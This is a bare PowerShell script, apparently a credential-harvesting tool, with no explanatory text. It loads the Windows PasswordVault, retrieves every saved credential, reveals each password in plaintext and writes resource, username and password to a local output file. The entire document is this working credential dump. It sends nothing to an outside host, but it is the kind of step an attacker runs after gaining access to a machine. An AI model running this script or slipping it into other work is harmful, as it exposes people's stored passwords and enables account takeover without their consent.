$filename="output.file"
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()
foreach ($c in $creds) {$c.RetrievePassword()}
$creds | Format-List -Property Resource,UserName,Password | Out-File $filename
exit